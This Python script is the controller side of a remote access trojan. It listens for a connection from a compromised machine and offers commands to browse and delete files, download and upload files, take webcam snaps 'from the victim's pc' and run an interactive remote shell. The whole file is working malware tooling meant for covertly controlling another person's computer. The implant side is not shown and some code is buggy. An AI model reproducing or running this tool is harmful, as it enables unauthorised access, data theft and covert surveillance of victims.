#!/bin/python3

import socket 
import sys
import os , re
import cv2
import random
import time


try:
    os.mkdir('snaps')
    print('[+] Snaps dir is not found ....')
    print("[+] Creating 'snaps' dir ....")

except FileExistsError:
    pass

#-------------------main func -----------------------


def bind():
    try:
        sock.bind((host,port))
        print()
        print('[*] Listening for incoming connections ......')
        sock.listen(5)
        
    except ConnectionResetError:    
        print('[-] falied to connect , Trying again ........')
        bind()
       
    except ConnectionAbortedError:
        print('[-] falied to connect , Trying again ........')
        bind()
        
def connect():

    global conn , addr
    conn , addr = sock.accept()
    print(f"[*] listenting to {addr[0]} ......")
    while 1:
        try : 
            cmd = input('cmd >>> ').strip()
            cmd1(cmd)
        except FileNotFoundError:

            print('[+] file not found ............')
            pass

   

def commands():
    print(
'''

         ----------------------------------- COMMANDS -----------------------------------------    
        |                                                                                      |
        |   hostname                     - get hostname                                        |
        |   ls                           - print all the files and folders in the pwd          |
        |   pwd                          - print the present working dir                       |
        |   cd                           - change dir                                          |
        |   upload                       - upload file from localhost to remotehost            |
        |   download                     - download a specific file                            |
        |   move                         - move from one dir to another                        |
        |   del                          - delete a file or a folder (permanently)             |
        |   open                         - open                                                |
        |   snap                         - take a snap from the victim's pc                    |
        |   shell                        - enters into the shell                               |
         --------------------------------------------------------------------------------------

''')

def get_leng():
    try :
        leng = conn.recv(1024)
        leng = int(leng.decode())
        return leng

    except ValueError as v:
        print(str(v))

def rand():

    global fname

    letter = 'qwertyuopasdfghjklzxcvbnm'
    fname = ''.join(random.sample(letter,5))
    fname = 'snaps\\'+fname+'.jpg'
    return fname
    
def cam(pname):

    read = cv2.imread(pname,1)
    snap = cv2.imshow(pname,read)
    cv2.waitKey(0)

def write(data,fname):
    with open(fname,'w') as file:
        file.write(str(data))

def cmd1(cmd):
        
    if cmd[:8] == 'download':

        try:
            fname = re.split(r'\\|/',cmd.split()[-1])[-1]
            print(f"[*] Downloading '{fname}' .....")
            conn.send(cmd.encode())
            leng = get_leng()
            print(f'leng is : {leng}')
            recv = conn.recv(leng)
            data = recv.decode()
            write(data,fname)

        except TypeError as t:
            print(t)
            pass

    elif cmd == 'snap':
        conn.send(cmd.encode())
        byts = conn.recv(1024)
        pic = conn.recv(int(byts))
        fname = rand()
        with open(fname,'wb') as file:
            file.write(pic)
        cam(fname)

    elif cmd == 'shell':

        conn.send(cmd.encode())

        while True:

            pwd = conn.recv(1024)
            pwd = pwd.decode()
            data = input(f'{pwd} #> ')

            if data == 'exit':
                conn.send(data.encode())
                break

            elif data[:2] == 'cd':
                conn.send(data.encode())
                err = conn.recv(1024)
                err = err.decode()
                if err != 'ok':
                    print(err)

            elif data != '':

                conn.send(data.encode())
                leng = conn.recv(1024)
                leng = int(leng.decode())
                stdout = conn.recv(leng)
                stdout = stdout.decode()
                print(stdout)

            else:
                conn.send('none'.encode())
                pass


    elif cmd[:6] == 'upload':

        try:
            fname = cmd[6:].strip()
            fname = re.split('\\|/',fname)
            fpath = cmd[6:].strip()

            if '.' not in list(fname[-1]):
                print("[-] You didn't specify the file name ....")

            else:
                with open(fpath, 'rb') as file:
                    data = file.read()

                conn.send(cmd[:6].encode())
                print(f'[*] uploading {fname[-1]}.....')
                conn.send(str(fname[-1]).encode())
                conn.send(str(len(data)).encode())
                conn.send(data)
                print(f'[+] uploaded {fname[-1]}.....')

        except FileNotFoundError as f:
            print('\n',f)
            print(f'[-] Make sure that your uploading file is in this dir : {pwd}')

        except PermissionError as pe:
            print('\n', pe)

    elif cmd[:4] == 'move':
        conn.send(cmd.encode())
        conn.send(move.encode())
        recv = conn.recv(1024)
        print(recv.decode())
                        
    elif cmd == 'help':
        commands()
        
                
    elif cmd == 'exit':
        conn.send('exit'.encode())
        print('\n[*] Terminating ......')
        # time.sleep(2)
        sys.exit()

    elif cmd != '':
        try:
            conn.send(cmd.encode())
            leng = get_leng()
            recv = conn.recv(leng)
            recv = recv.decode()
            print()
            print(recv)
            print()

        except TypeError as T:
            print(str(T))

    else:
        pass
            

# ----------------------- END ------------------------

sock = socket.socket( socket.AF_INET , socket.SOCK_STREAM )
#hostname = socket.gethostname()
host = '127.0.0.1'
port = 6969
bind()

try:
    connect()

except ConnectionResetError as c:
    print()
    print(c)
    print('Connection failed  , Trying again .......')
    connect()
    
    
except socket.error as s:
    print()
    print(s)
    print('Connection failed  , Trying again .......')
    connect()
    

        
